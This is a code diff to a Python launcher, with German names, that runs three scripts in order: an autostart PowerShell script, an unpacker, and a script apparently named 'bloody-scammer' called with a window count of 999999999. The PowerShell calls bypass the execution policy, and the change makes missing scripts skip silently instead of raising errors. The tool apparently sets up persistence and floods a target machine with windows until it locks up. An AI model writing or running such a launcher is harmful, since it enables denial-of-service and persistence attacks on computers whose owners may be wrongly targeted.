@@ -10,38 +10,36 @@ BLOODY_SCAMMER = ORDNER / "bloody-scammer.ps1"
 
 
 def starte() -> None:
-    if not AUTOSTART.is_file():
-        raise FileNotFoundError(f"Datei nicht gefunden: {AUTOSTART}")
-    if not ENTPACKER.is_file():
-        raise FileNotFoundError(f"Datei nicht gefunden: {ENTPACKER}")
-    if not BLOODY_SCAMMER.is_file():
-        raise FileNotFoundError(f"Datei nicht gefunden: {BLOODY_SCAMMER}")
+    if AUTOSTART.is_file():
+        subprocess.run(
+            [
+                "powershell.exe",
+                "-NoProfile",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-File",
+                str(AUTOSTART),
+            ],
+            check=True,
+        )
 
-    subprocess.run(
-        [
-            "powershell.exe",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-File",
-            str(AUTOSTART),
-        ],
-        check=True,
-    )
-    subprocess.run([sys.executable, str(ENTPACKER)], check=True)
-    subprocess.run(
-        [
-            "powershell.exe",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-File",
-            str(BLOODY_SCAMMER),
-            "-WindowCount",
-            "999999999",
-        ],
-        check=True,
-    )
+    if ENTPACKER.is_file():
+        subprocess.run([sys.executable, str(ENTPACKER)], check=True)
+
+    if BLOODY_SCAMMER.is_file():
+        subprocess.run(
+            [
+                "powershell.exe",
+                "-NoProfile",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-File",
+                str(BLOODY_SCAMMER),
+                "-WindowCount",
+                "999999999",
+            ],
+            check=True,
+        )
 
 
 if __name__ == "__main__":
